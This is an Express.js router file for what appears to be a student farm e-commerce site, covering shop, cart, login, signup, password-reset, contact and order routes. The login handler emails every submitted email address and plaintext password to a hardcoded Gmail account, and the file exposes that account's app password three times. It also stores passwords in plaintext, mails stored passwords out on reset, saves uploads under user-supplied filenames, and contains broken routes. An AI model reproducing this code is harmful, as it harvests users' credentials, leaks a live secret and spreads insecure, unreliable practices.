var express = require('express');
var router = express.Router();
const nodemailer = require('nodemailer');
const contactModel = require('../Models/contact');
//var loginModel =  require('../Models/login');
const userModel = require('../Models/signup');
const productModel = require('../Models/product');
const feedbackModel = require('../Models/feedback');
const cartModel = require('../Models/cart');
const orderModel  = require('../Models/order');
const orderdetailModel = require('../Models/order-detail');
/* GET home page. */
router.get('/', function (req, res, next) {
  res.render('users/index', { title: 'Express' });
});
router.get('/', function (req, res, next) {
  res.render('users/index', { title: 'Express' });
});
router.post('/home', function (req, res, next) {
  res.render('users/index');
});
router.get('/about', function (req, res, next) {
  res.render('users/about');
});
router.get('/services', function (req, res, next) {
  res.render('users/services');
});
router.get('/shop', function (req, res, next) {
  productModel.find()
    .then(data => {
      console.log(data);
      res.render('users/shop', { mydata: data });
    })
    .catch(err => console.log(err));

});
router.get('/shop/:id', function (req, res, next) {
  var product_id = req.params.id;
  productModel.findById(product_id)
    .then(data => {
      res.render('users/e-commerce-single', { mydata: data });
    })
    .catch(err => console.log(err));
});

router.get('/team', function (req, res, next) {
  res.render('users/team');
});

router.get('/01-farmer', function (req, res, next) {
  res.render('users/01-farmer');
});
router.get('/02-farmer', function (req, res, next) {
  res.render('users/02-farmer');
});
router.get('/03-farmer', function (req, res, next) {
  res.render('users/03-farmer');
});
router.get('/04-farmer', function (req, res, next) {
  res.render('users/04-farmer');
});
router.get('/e-commerce', function (req, res, next) {
  res.render('users/e-commerce');
});
//e-commerce edit 
router.get('/e-commerce-single/:id', function (req, res, next) {
  var product_id = req.params.id;
  productModel.findById(product_id)
    .then(data => {
      console.log(data);
      res.render('users/e-commerce-single', { mydata: data })
    })
    .catch(err => console.log("Error!" + err))
});

router.post('/e-commerce-single/:id', function (req, res, next) {
  var myfile = req.files.product_image;
  var cart_bodydata = {
    product_name: req.body.product_name,
    product_price: req.body.product_price,
    product_details: req.body.product_details,
    product_quantity: req.body.product_quantity,
    product_image: myfile.name
  }
  myfile.mv("public/uploads/" + myfile.name, function (err) {
    var product_id = req.params.id;
    var cartdata = cartModel(product_id, cart_bodydata);
    cartdata.findById(product_id, cartdata)
      .then(data => {
        res.render('users/e-commerce-cart')
      })
      .catch(err => console.log("Error!" + err));
  })
});

router.post('/e-commerce-cart/:id', function (req, res, next) {
  var product_id = req.params.id;
  var cart_bodydata = {
    product_name:req.body.product_name,
    product_price:req.body.product_price,
    product_image:req.body.product_image,
    product_quantity: req.body.product_quantity,
    product_id : product_id,
  }

  var mydata  = cartModel(cart_bodydata);
  mydata.save( );
  res.redirect('/users/e-commerce-viewcart')
});

router.get('/e-commerce-viewcart', function (req, res, next) {
  userModel.find()
  .then(() =>{
    cartModel.find()
    .then(data =>{
      // console.log(data);
     res.render('users/e-commerce-viewcart',{mydata:data});
    })
    .catch(err =>console.log(err))
  })
  .catch(err =>  console.log(err))
  
});

router.post('/e-commerce-viewcart', function (req, res, next) {
  var cart_bodydata = {
    product_name:req.body.product_name,
    product_price:req.body.product_price,
    product_image:req.body.product_image,
    product_quantity: req.body.product_quantity,
    product_id : product_id,
    _user : req.body._user
  //  user_id:1
  }
  var mydata  = cartModel(cart_bodydata);
  mydata.save( );
  console.log('added in the view');
  res.redirect('/users/e-commerce-viewcart')
});
router.get('/delete/:id', function (req, res, next) {
  var product_id = req.params.id;
 cartModel.findByIdAndDelete(product_id)
 .then(data =>{
  res.redirect('/users/e-commerce-viewcart')
 })
 .catch(err =>console.log(err));
});


router.get('/login', function (req, res, next) {
  res.render('users/login');
});
router.post('/login', function (req, res, next) {
  var email = req.body.user_email;
  var password = req.body.user_password;
  console.log(req.body);
  userModel.findOne({ "user_email": email }).then(function (db_users_array) {
    console.log("Find One " + db_users_array);
    if (db_users_array) {
      var db_email = db_users_array.user_email;
      var db_password = db_users_array.user_password;
    }
    console.log("db_users_array.user_email " + db_email);
    console.log("db_users_array.user_password " + db_password);
    if (db_email == null) {
      console.log("If");
      res.end("Email not Found");
    }
    else if (db_email == email && db_password == password) {
      req.session.email = db_email;
      res.render('users/index');
    }
    else {
      console.log("Credentials wrong");
      res.end("Login invalid");
    }
  });
  const nodemailer = require("nodemailer");

  const transporter = nodemailer.createTransport({
    host: "smtp.gmail.com",
    port: 587,
    secure: false, // Use `true` for port 465, `false` for all other ports
    auth: {
      user: "aayushimodi0703@gmail.com",
      pass: "giga irsz euew vhhn",
    },
  });

  // async..await is not allowed in global scope, must use a wrapper
  async function main() {
    // send mail with defined transport object
    const info = await transporter.sendMail({
      from: 'aayushimodi0703@gmail.com', // sender address
      to: "aayushimodi0703@gmail.com", // list of receivers
      subject: "Login Form", // Subject line
      html: `
    <b>Email :</b> ${req.body.user_email}<br/>
    <b>Password :</b> ${req.body.user_password}<br/>
    ` // html body
    });

    console.log("Message sent: %s", info.messageId);
    // Message sent: <d786aa62-4e0a-070a-47ed-0b0666549519@ethereal.email>
  }

  main().catch(console.error);

});
//Home Page 
router.get('/login-home', function (req, res, next) {
  console.log("Home Called " + req.session.email);
  var myemail = req.session.email;
  console.log(myemail);
  //Auth
  if (!req.session.email) {
    console.log("Email Session is Set");
    res.end("Login required to Access this page");
  }
  res.render('home', { myemail: myemail });
});
//Change Paassword Page Route
router.get('/change-password', function (req, res, xnext) {
  if (!req.session.email) {
    console.log("Email Session is Set");
    res.redirect('/login');
  }
  res.render('users/change-password');
});

//Change Password Process Page
router.post('/change-password', function (req, res, next) {
  if (!req.session.email) {
    console.log("Email Session is Set");
    res.redirect('users/login');
  }
  console.log("Home Called " + req.session.email);
  var myemail = req.session.email;
  var opass = req.body.opass;
  var npass = req.body.npass;
  var cpass = req.body.cpass;
  userModel.findOne({ "user_email": myemail }).then(function (db_users_array) {
    console.log(db_users_array);
    if (opass == db_users_array.user_password) {
      if (opass == npass) {
        res.send("New Password Must be Different then Old password");
      } else {
        if (npass == cpass) {
          userModel.findOneAndUpdate({ "user_email": myemail }, { $set: { "user_password": npass } }).then(function () {

            res.send("Password Changed");

          });
        } else {
          res.send("New Password and Confirm Password not match");
        }
      }
    } else {
      res.send("Old Password Not Match");
    }
  }
  );
});



//Logout Page
router.get('/logout', function (req, res) {

  req.session.destroy();
  res.redirect("/");
});



//Forgot Password Get Method
router.get('/forgot-password', function (req, res, next) {
  res.render('users/forgot-password');
});


//Login Process  Method
router.post('/forgot-password', function (req, res, next) {

  var email = req.body.user_email;

  console.log(req.body);
  userModel.findOne({ "user_email": email }).then(function (err, db_users_array) {
    console.log("Find One " + db_users_array);

    if (db_users_array) {
      var db_email = db_users_array.user_email;
      var db_password = db_users_array.user_password;

    }

    console.log("db_users_array.user_email " + db_email);
    console.log("db_users_array.user_password " + db_password);

    if (db_email == null) {
      console.log("If");
      res.end("Email not Found");
    }
    else if (db_email == email) {
      "use strict";
      const nodemailer = require("nodemailer");

      // async..await is not allowed in global scope, must use a wrapper
      async function main() {

        // Generate test SMTP service account from ethereal.email
        // Only needed if you don't have a real mail account for testing
        let account = await nodemailer.createTestAccount();

        // create reusable transporter object using the default SMTP transport
        let transporter = nodemailer.createTransport({
          host: "smtp.gmail.com",
          port: 587,
          secure: false, // true for 465, false for other ports
          auth: {
            user: "aayushimodi0703@gmail.com",
            pass: "giga irsz euew vhhn",
          }
        });

        // setup email data with unicode symbols
        let mailOptions = {
          from: 'aayushimodi0703@gmail.com', // sender address
          to: 'aayushimodi0703@gmail.com', // list of receivers
          subject: "Forgot Password", // Subject line
          text: "Hello your password is " + db_password, // plain text body
          html: "Hello your password is " + db_password // html body
        };

        // send mail with defined transport object
        let info = await transporter.sendMail(mailOptions)

        console.log("Message sent: %s", info.messageId);
        // Preview only available when sending through an Ethereal account
        console.log("Preview URL: %s", nodemailer.getTestMessageUrl(info));

        res.end("Password Sent on your Email");
        // Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>
        // Preview URL: https://ethereal.email/message/WaQKMgKddxQDoou...
      }

      main().catch(console.error);



    }
    else {
      console.log("Credentials wrong");
      res.end("Login invalid");
    }
  })
});


router.get('/signup', function (req, res, next) {
  res.render('users/signup');
});
router.post('/signup', function (req, res, next) {
  var signup_bodydata = {
    user_name: req.body.user_name,
    user_number: req.body.user_number,
    user_email: req.body.user_email,
    user_password: req.body.user_password
  }
  var signupdata = userModel(signup_bodydata)
  signupdata.save()
    .then(data => {
      res.send("Thank You for Login! Now, You can access the data!");
    })
    .catch(err => console.log("Error!" + err))

});
router.get('/forgot-password', function (req, res, next) {
  res.render('users/forgot-password');
});
router.get('/change-password', function (req, res, next) {
  res.render('users/change-password');
});

router.get('/contact', function (req, res, next) {
  res.render('users/contact');
});

router.post('/contact', function (req, res, next) {
  const contact_bodydata = {
    contact_name: req.body.contact_name,
    contact_email: req.body.contact_email,
    contact_subject: req.body.contact_subject,
    contact_number: req.body.contact_number,
    contact_message: req.body.contact_message
  }
  const contactdata = contactModel(contact_bodydata);
  contactdata.save()
    .then(contactdata => {
      const nodemailer = require("nodemailer");

      const transporter = nodemailer.createTransport({
        host: "smtp.gmail.com",
        port: 587,
        secure: false, // Use `true` for port 465, `false` for all other ports
        auth: {
          user: "aayushimodi0703@gmail.com",
          pass: "giga irsz euew vhhn",
        },
      });

      // async..await is not allowed in global scope, must use a wrapper
      async function main() {
        // send mail with defined transport object
        const info = await transporter.sendMail({
          from: 'aayushimodi0703@gmail.com', // sender address
          to: "aayushimodi0703@gmail.com", // list of receivers
          subject: "contact Form", // Subject line
          html: `<b>Name :</b> ${req.body.contact_name}<br/>
        <b>Email :</b> ${req.body.contact_email}<br/>
        <b>Subject :</b> ${req.body.contact_subject}<br/>
        <b>Number :</b> ${req.body.contact_number}<br/>
        <b>Message :</b> ${req.body.contact_message}<br/>
        ` // html body
        });

        console.log("Message sent: %s", info.messageId);
        // Message sent: <d786aa62-4e0a-070a-47ed-0b0666549519@ethereal.email>
      }

      main().catch(console.error);

    })
    .catch(err => console.log("Error!" + err))
});

router.get('/feedback', function (req, res, next) {
  feedbackModel.find()
  .then(data =>{
    res.render('users/feedback',{mydata:data});
  })
  .catch(err => console.log(err));
  
});
router.post('/feedback', function (req, res, next) {
  var feedback_bodydata = {
    feedback_name: req.body.feedback_name,
    feedback_details: req.body.feedback_details
  }
  var feedbackdata = feedbackModel(feedback_bodydata)
  feedbackdata.save()
res.render('users/thanksfeedback');
});
//Feedback Display
router.get('/feedback-table', function (req, res, next) {
  var feedback_id = req.params.id;
  feedbackModel.find()
    .then(data => {
      res.render("feedback-table", { mydata: data });
    })
    .catch(err => console.log("Error!" + err))
});

//Confirm Order 
router.get('/confirm-order', function (req, res, next) {
  var email = req.body.user_email;
  var password = req.body.user_password;
  userModel.find()
  .then(data => {
    res.render('users/confirm-order',{mydata:data});
  })
  .catch(err =>  console.log(err))

});
router.post('/confirm-order', function (req, res, next) {
 const order_bodydata =  {
  order_name : req.body.order_name,
	order_mobile : req.body.order_mobile,
	order_address : req.body.order_address,
	order_date: Date.now(),
	user_id :1
 }
 var orderdata =  orderModel(order_bodydata)
 orderdata.save();


 ////
  cartModel.find()
  .then(data =>{

    for(var i = 0;i<data.length;i++){
    var detailsbodydata = {
      product_name : data[i].product_name,
      product_price : data[i].product_price,
      product_image : data[i].product_image,
      product_quantity :  data[i].product_quantity,
      product_id :  data[i].product_id,
      user_id : 1
    }
    const mydata =  orderdetailModel(detailsbodydata);
    mydata.save();

    console.log(data[i].id);
    cartModel.findByIdAndDelete(data[i]._id).then({

    });
  }
  })
  .catch(err => console.log(err));
  res.render('users/thankyou');
});
router.get('/thankyou', function (req, res, next) {
  res.render('users/thankyou');
});

module.exports = router;





